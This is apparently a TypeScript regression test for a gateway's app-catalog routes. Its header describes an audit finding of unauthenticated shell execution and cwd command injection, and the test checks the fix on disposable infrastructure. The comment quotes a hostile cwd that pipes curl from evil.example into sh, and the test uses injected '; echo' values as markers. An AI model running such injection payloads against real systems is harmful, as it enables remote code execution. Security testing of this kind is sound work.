// gateway-catalog-capability.test.ts
//
// /apps/catalog/upsert, /apps/catalog/delete, /apps/catalog/spawn: the
// catalog's real mutation surface. spawn runs the entry's own `cmd` via
// io.popen (apps.lua) -- writing an entry and then spawning it is, end to
// end, an arbitrary-shell-command primitive. Found live 2026-10-03 during
// an audit of the remaining netget/monad admin routes: these three were
// gated only by apps.lua's own is_local_request() (the same loopback-IP
// check openresty.lua/dev_server.lua used before their own fix), with no
// method restriction at all on upsert/delete and no signed proof anywhere.
// Confirmed exploitable: a simulated cross-origin request chain (Origin:
// https://evil.example, no credentials beyond being on this machine)
// upserted a catalog entry and spawned it, and the shell command genuinely
// ran.
//
// A second, independent bug sat alongside the authorization one: cwd (and
// the internally-built log path) were interpolated into the shell command
// line unquoted (`string.format("cd %s && %s >> %s 2>&1 &", cwd, cmd,
// log)`). cmd being shell syntax is the catalog's deliberate design (once
// the caller is properly authorized) -- but cwd is supposed to be just a
// path. An attacker-chosen cwd like `/tmp; curl evil.example|sh #` runs a
// second, fully independent command via the unescaped `;`, regardless of
// what cmd says or how well upsert/spawn are authorized. Fixed with
// shell_quote() around cwd/log (never cmd, which must keep running as real
// shell syntax for the catalog to still do its job).
//
// Fix (same gate /openresty-restart etc. use, setNginxConfigRoutes.ts's
// controlActionGate, applied to these three locations): 405 for anything
// but POST/OPTIONS; loopback-only; then middleware/me_sig.lua verifies a
// real X-Me-Proof; apps.lua's own has_capability() (lib/operator_access.lua)
// makes the capability decision -- no owner/admin bypass, matching
// gateway-control-action-capability.test.ts's own corrected model.
//
// This file proves the full chain end to end, real signed proofs (this.me +
// cleaker), entirely on disposable infra (fresh temp OpenResty + monad + a
// temp catalog/runtime dir, never the real ambient gateway, never ~/.get):
// no proof, a tampered proof, or a valid proof without the exact capability
// must change neither the catalog file nor the filesystem (the spawned
// command's own side effect); only a valid proof with the exact capability
// does -- and even then, cwd/log injection must not escape the intended
// command.
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawn } from 'node:child_process';
import ME from 'this.me';
import cleaker from 'cleaker';

const openrestyBin = ['/opt/homebrew/bin/openresty', '/usr/local/bin/openresty', '/usr/bin/openresty'].find((p) => fs.existsSync(p));
if (!openrestyBin) { console.log('skipped: no openresty on this machine'); process.exit(0); }

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'netget-catalog-jewel-'));
const home = path.join(tmp, 'home'); const dataDir = path.join(tmp, 'data'); const prefix = path.join(tmp, 'or');
fs.mkdirSync(home, { recursive: true });
fs.mkdirSync(path.join(dataDir, 'runtime'), { recursive: true }); fs.mkdirSync(path.join(dataDir, 'html'), { recursive: true });
fs.writeFileSync(path.join(dataDir, 'html', 'index.html'), '<!doctype html><title>panel</title>');
for (const d of ['conf', 'conf.d', 'logs', 'lua']) fs.mkdirSync(path.join(prefix, d), { recursive: true });
process.env.HOME = home; process.env.NETGET_DATA_DIR = dataDir; process.env.NETGET_MONAD_NAMESPACE = 'catalog-jewel.me';
process.env.NETGET_MAIN_SERVER_RECONCILE_MS = '0';
delete process.env.NETGET_MONAD_ORIGIN; delete process.env.JWT_SECRET;

const certDir = path.join(tmp, 'cert'); fs.mkdirSync(certDir);
const keyFile = path.join(certDir, 'k.pem'); const crtFile = path.join(certDir, 'c.pem');
execFileSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', keyFile, '-out', crtFile, '-days', '2', '-subj', '/CN=localhost',
  '-addext', 'subjectAltName=DNS:localhost,DNS:local.netget,IP:127.0.0.1'], { stdio: 'ignore' });
fs.mkdirSync(path.join(home, '.netget', 'certs'), { recursive: true });
fs.copyFileSync(crtFile, path.join(home, '.netget', 'certs', 'local.netget.pem'));
fs.copyFileSync(keyFile, path.join(home, '.netget', 'certs', 'local.netget-key.pem'));

const freePort = () => new Promise<number>((resolve) => { const s = net.createServer(); s.listen(0, '127.0.0.1', () => { const p = (s.address() as any).port; s.close(() => resolve(p)); }); });
const HTTP_PORT = await freePort(); const HTTPS_PORT = await freePort();

const netgetTsRoot = '/Users/suign/Desktop/Neuroverse/all.this/modules/netget/Typescript';
const modulePath = path.resolve(netgetTsRoot, 'src/gateway/monadModule.mjs');
const { createMonadApp } = await import('monad.ai');
const monadRoot = path.join(tmp, 'monad'); fs.mkdirSync(monadRoot, { recursive: true });
const app: any = await createMonadApp({
  cwd: monadRoot, seed: 'catalog-jewel-seed', namespace: 'catalog-jewel.me',
  stateDir: path.join(monadRoot, 'me-state'), claimDir: path.join(monadRoot, 'claims'), selfConfigPath: path.join(monadRoot, 'self.json'),
  selfIdentity: 'catalog-jewel.me', selfHostname: 'catalog-jewel.me', selfEndpoint: 'http://127.0.0.1:0', selfTags: ['local'], port: 0,
  guiPkgDistDir: monadRoot, mePkgDistDir: monadRoot, cleakerPkgDistDir: monadRoot, reactUmdDir: monadRoot, reactDomUmdDir: monadRoot,
  routesPath: path.join(monadRoot, 'routes.js'), modules: [modulePath], logger: false,
});
assert.deepEqual(app.monadModules.failed, [], JSON.stringify(app.monadModules.failed));
const monad: http.Server = await new Promise((resolve) => { const s = app.listen(0, '127.0.0.1', () => resolve(s)); });
const monadOrigin = `http://127.0.0.1:${(monad.address() as any).port}`;
process.env.NETGET_MONAD_ORIGIN = monadOrigin;
process.env.NETGET_GATEWAY_UPSTREAM = monadOrigin;

const { buildNginxConfigContent } = await import(path.join(netgetTsRoot, 'src/modules/NetGetX/OpenResty/setNginxConfigFile.ts'));
const { getNetgetAppConfContent } = await import(path.join(netgetTsRoot, 'src/modules/NetGetX/OpenResty/setNginxConfigRoutes.ts'));
const layout: any = {
  layoutKey: 'linux-source', configDir: path.join(prefix, 'conf'), confDDir: path.join(prefix, 'conf.d'), logDir: path.join(prefix, 'logs'),
  configFilePath: path.join(prefix, 'conf', 'nginx.conf'), luaDir: path.join(prefix, 'lua'),
  luaPackagePath: `${path.join(prefix, 'lua')}/?.lua;${path.join(prefix, 'lua')}/?/init.lua;/opt/homebrew/opt/openresty/site/lualib/?.lua;/opt/homebrew/opt/openresty/site/lualib/?/init.lua;;`, userDirective: '', isSupported: true,
};
const highPorts = (conf: string) => conf
  .replace(/^\s*listen \[::\]:\d+.*;\n/gm, '')
  .replace(/listen 80( default_server)?;/g, `listen ${HTTP_PORT}$1;`)
  .replace(/listen 443 ssl( default_server)?;/g, `listen ${HTTPS_PORT} ssl$1;`);
const appConf = getNetgetAppConfContent(layout);
fs.writeFileSync(path.join(prefix, 'conf', 'nginx.conf'), highPorts(buildNginxConfigContent(layout)).replace(/^events \{/m, `pid ${path.join(prefix, 'logs', 'nginx.pid')};\nevents {`));
fs.writeFileSync(path.join(prefix, 'conf.d', 'netget_app.conf'), highPorts(appConf));
fs.copyFileSync('/opt/homebrew/etc/openresty/mime.types', path.join(prefix, 'conf', 'mime.types'));
fs.cpSync(path.join(netgetTsRoot, 'src/modules/NetGetX/OpenResty/lua'), path.join(prefix, 'lua'), { recursive: true });

let nginx: import('node:child_process').ChildProcess | null = null;
const stopNginx = () => { try { execFileSync(openrestyBin, ['-p', prefix, '-c', path.join(prefix, 'conf', 'nginx.conf'), '-s', 'stop'], { stdio: 'ignore' }); } catch { } nginx?.kill(); nginx = null; };
const startNginx = async () => {
  const full = { ...process.env, NETGET_DATA_DIR: dataDir };
  const t = spawn(openrestyBin, ['-t', '-p', prefix, '-c', path.join(prefix, 'conf', 'nginx.conf')], { env: full });
  let out = ''; t.stderr.on('data', (d) => { out += d; }); t.stdout.on('data', (d) => { out += d; });
  assert.equal(await new Promise((r) => t.on('close', r)), 0, `openresty -t failed:\n${out}`);
  nginx = spawn(openrestyBin, ['-p', prefix, '-c', path.join(prefix, 'conf', 'nginx.conf')], { env: full, stdio: 'ignore' });
  const listening = (port: number) => new Promise<boolean>((r) => { const c = net.connect(port, '127.0.0.1', () => { c.destroy(); r(true); }); c.on('error', () => r(false)); });
  for (let i = 0; i < 50; i += 1) {
    if (await listening(HTTP_PORT)) { await new Promise((r) => setTimeout(r, 200)); return; }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('nginx did not start');
};

function canonicalJson(obj: Record<string, unknown>): string {
  return JSON.stringify(Object.fromEntries(Object.entries(obj).sort(([a], [b]) => a.localeCompare(b))));
}
function genNonce(): string { return crypto.randomBytes(16).toString('hex'); }
function sha256Hex(data: string): string { return crypto.createHash('sha256').update(data, 'utf8').digest('hex'); }

async function signedRequest(node: any, hostname: string, method: string, p: string, bodyObj?: Record<string, unknown>, opts: { noProof?: boolean; tamperProof?: boolean } = {}) {
  const bodyStr = bodyObj ? JSON.stringify(bodyObj) : '';
  const signed = { method, path: p, bodyHash: sha256Hex(bodyStr), nonce: genNonce(), timestamp: Date.now() };
  const headers: Record<string, string> = { host: 'localhost', connection: 'close' };
  if (bodyStr) headers['content-type'] = 'application/json';
  if (!opts.noProof) {
    const challenge = canonicalJson(signed);
    const proof = await node.prove({ rootNamespace: hostname, challenge });
    if (opts.tamperProof) (proof as any).identityHash = 'f'.repeat(64); // a proof that fails signature verification against anchored claims
    headers['x-me-proof'] = Buffer.from(JSON.stringify(proof)).toString('base64url');
  }
  const res: { status: number; text: string } = await new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: HTTP_PORT, method, path: p, timeout: 8000, headers }, (r) => {
      let text = ''; r.setEncoding('utf8'); r.on('data', (c) => { text += c; });
      r.on('end', () => resolve({ status: r.statusCode || 0, text }));
    });
    req.on('error', reject); req.on('timeout', () => req.destroy(new Error('timeout')));
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
  let json: any = {}; try { json = JSON.parse(res.text); } catch { /* not json */ }
  return { status: res.status, json };
}

const claimsPath = path.join(dataDir, 'runtime', 'gateway-claims.json');
function readClaims(): any {
  if (!fs.existsSync(claimsPath)) return { pubkeys: {}, grants: {}, admins: {}, usernames: {}, owner: null };
  return JSON.parse(fs.readFileSync(claimsPath, 'utf8'));
}
function writeClaims(claims: any) { fs.writeFileSync(claimsPath, JSON.stringify(claims), 'utf8'); }

const catalogPath = path.join(dataDir, 'runtime', 'monad-catalog.json');
function readCatalog(): any {
  if (!fs.existsSync(catalogPath)) return {};
  return JSON.parse(fs.readFileSync(catalogPath, 'utf8'));
}

try {
  await startNginx();

  const ME_RESEED = Symbol.for('me.internal.reseed');
  const me = new (ME as any)();
  (me as any)[ME_RESEED]('catalog-jewel-identity', 'catalog-jewel-secret-do-not-reuse');
  const node = cleaker(me as any, 'localhost');
  const idProof = await node.prove({ rootNamespace: 'localhost', challenge: null });
  const identityHash = idProof.identityHash;
  const publicKey = idProof.publicKey;

  function anchor(opts: { admin?: boolean; scopes?: string[] } = {}) {
    const claims = readClaims();
    claims.pubkeys = claims.pubkeys || {};
    claims.grants = claims.grants || {};
    claims.admins = claims.admins || {};
    claims.usernames = claims.usernames || {};
    claims.pubkeys[identityHash] = publicKey;
    claims.usernames[identityHash] = 'catalog-jewel-identity';
    if (opts.admin) claims.admins[identityHash] = true; else delete claims.admins[identityHash];
    if (opts.scopes) claims.grants[identityHash] = opts.scopes; else delete claims.grants[identityHash];
    writeClaims(claims);
  }

  let pass = 0; let fail = 0;
  const check = (label: string, cond: boolean, detail?: unknown) => {
    if (cond) { pass += 1; console.log(`  ✓ ${label}`); }
    else { fail += 1; console.log(`  ✗ ${label}`, detail ?? ''); }
  };

  const markerFile = path.join(tmp, 'rce-check.txt');
  const entryName = 'audit-probe';
  const upsertBody = { name: entryName, cmd: `echo pwned > ${JSON.stringify(markerFile)}`, cwd: tmp };

  // ═══ 1. the real exploit chain, now closed ═══
  console.log('\n[1] upsert with no proof, a tampered proof, or no capability must not touch the catalog');
  {
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/upsert', upsertBody, { noProof: true });
    check('no X-Me-Proof at all -> 401', r.status === 401, JSON.stringify(r.json));
    check('catalog file not created', !fs.existsSync(catalogPath));
  }
  {
    anchor({}); // identity anchored, no admin, no grants at all
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/upsert', upsertBody, { tamperProof: true });
    check('a proof that fails signature verification -> 401', r.status === 401, JSON.stringify(r.json));
    check('catalog still not written', !fs.existsSync(catalogPath) || !readCatalog()[entryName]);
  }
  {
    anchor({}); // valid identity, no capability at all
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/upsert', upsertBody);
    check('valid proof, NO capability -> 403 CAPABILITY_DENIED', r.status === 403 && r.json.error === 'CAPABILITY_DENIED', JSON.stringify(r.json));
    check('catalog still not written', !fs.existsSync(catalogPath) || !readCatalog()[entryName]);
  }
  {
    anchor({ admin: true }); // admin, still no explicit grant
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/upsert', upsertBody);
    check('admin alone -> still 403', r.status === 403 && r.json.error === 'CAPABILITY_DENIED', JSON.stringify(r.json));
    check('catalog still not written', !fs.existsSync(catalogPath) || !readCatalog()[entryName]);
  }

  console.log('\n[2] upsert with the exact grant succeeds; spawn still needs its OWN exact grant');
  {
    anchor({ admin: true, scopes: ['gateway:control:apps-catalog-upsert'] });
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/upsert', upsertBody);
    check('upsert with the exact grant -> 200', r.status === 200 && r.json.success === true, JSON.stringify(r.json));
    check('catalog now has the entry', readCatalog()[entryName]?.cmd === upsertBody.cmd);
  }
  {
    // the upsert grant does NOT also grant spawn -- a different explicit capability
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/spawn', { name: entryName });
    check('spawn WITHOUT its own grant (even though upsert just succeeded) -> 403', r.status === 403 && r.json.error === 'CAPABILITY_DENIED', JSON.stringify(r.json));
    check('marker file NOT created', !fs.existsSync(markerFile));
  }

  console.log('\n[3] spawn with the exact grant actually runs the command (the real jewel for this chain)');
  {
    anchor({ admin: true, scopes: ['gateway:control:apps-catalog-spawn'] });
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/spawn', { name: entryName });
    check('spawn with the exact grant -> 200', r.status === 200 && r.json.success === true, JSON.stringify(r.json));
    await new Promise((resolve) => setTimeout(resolve, 1000));
    check('the command actually ran (marker file exists)', fs.existsSync(markerFile));
  }

  console.log('\n[4] GET/HEAD never reach any of the three, even with a valid admin+grant proof');
  for (const p of ['/apps/catalog/upsert', '/apps/catalog/delete', '/apps/catalog/spawn']) {
    const r: { status: number } = await new Promise((resolve, reject) => {
      const req = http.request({ host: '127.0.0.1', port: HTTP_PORT, method: 'GET', path: p, timeout: 8000, headers: { host: 'localhost' } }, (res) => {
        res.on('data', () => {}); res.on('end', () => resolve({ status: res.statusCode || 0 }));
      });
      req.on('error', reject); req.on('timeout', () => req.destroy(new Error('timeout')));
      req.end();
    });
    check(`GET ${p} -> 405`, r.status === 405, r.status);
  }

  console.log('\n[5] delete requires its own exact grant too');
  {
    anchor({ admin: true, scopes: ['gateway:control:apps-catalog-spawn'] }); // has spawn, not delete
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/delete', { name: entryName });
    check('delete without the delete grant -> 403', r.status === 403 && r.json.error === 'CAPABILITY_DENIED', JSON.stringify(r.json));
    check('entry still present', !!readCatalog()[entryName]);
  }
  {
    anchor({ admin: true, scopes: ['gateway:control:apps-catalog-delete'] });
    const r = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/delete', { name: entryName });
    check('delete with the exact grant -> 200', r.status === 200 && r.json.success === true, JSON.stringify(r.json));
    check('entry actually gone', !readCatalog()[entryName]);
  }

  console.log('\n[6] the cwd shell-injection fix: a hostile cwd cannot run a second command');
  {
    anchor({ admin: true, scopes: ['gateway:control:apps-catalog-upsert', 'gateway:control:apps-catalog-spawn'] });
    const injectionMarker = path.join(tmp, 'injection-proof.txt');
    const hostileEntry = {
      name: 'hostile-cwd',
      // The ONLY way the old code could be made to run this second command
      // was via cwd breaking out of `cd <cwd> && <cmd>` -- cmd here never
      // mentions injectionMarker at all.
      cmd: 'echo this-is-the-real-cmd',
      cwd: `/tmp; echo INJECTED > ${JSON.stringify(injectionMarker)} #`,
    };
    const up = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/upsert', hostileEntry);
    check('upsert of the hostile entry still succeeds (cmd/cwd are free-form strings, by design)', up.status === 200);
    const sp = await signedRequest(node, 'localhost', 'POST', '/apps/catalog/spawn', { name: 'hostile-cwd' });
    check('spawn of it returns success (the intended cmd just fails harmlessly: no such cwd)', sp.status === 200, JSON.stringify(sp.json));
    await new Promise((resolve) => setTimeout(resolve, 1000));
    check('the injected second command did NOT run', !fs.existsSync(injectionMarker));
  }

  console.log(`\n${pass} passed, ${fail} failed`);
  if (fail > 0) process.exitCode = 1;
} finally {
  stopNginx();
  await new Promise((resolve) => monad.close(resolve));
  fs.rmSync(tmp, { recursive: true, force: true });
}
console.log('catalog jewel probe complete');
